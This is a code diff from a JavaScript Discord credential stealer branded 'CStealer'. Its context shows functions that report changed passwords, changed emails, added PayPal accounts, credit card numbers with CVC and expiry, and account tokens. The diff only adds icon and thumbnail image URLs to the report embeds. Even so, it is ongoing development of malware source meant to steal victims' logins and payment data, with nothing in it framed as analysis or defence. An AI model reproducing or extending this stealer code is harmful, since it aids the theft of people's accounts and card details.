@@ -694,6 +694,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
         text: 'CStealer | t.me/cstealerr',
+        icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
         },
         thumbnail: {
           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
@@ -739,6 +740,10 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
           text: 'CStealer | t.me/cstealerr',
+          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+        },
+         thumbnail: {
+           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
         },
       },
     ],
@@ -781,6 +786,10 @@ const PaypalAdded = async (token) => {
         },
         footer: {
           text: 'CStealer | t.me/cstealerr',
+          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+        },
+         thumbnail: {
+           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
         },
       },
     ],
@@ -823,6 +832,10 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
           text: 'CStealer | t.me/cstealerr',
+          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+        },
+         thumbnail: {
+           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
         },
       },
     ],
@@ -867,6 +880,10 @@ const nitroBought = async (token) => {
         },
         footer: {
           text: 'CStealer | t.me/cstealerr',
+          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+        },
+         thumbnail: {
+           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
         },
       },
     ],
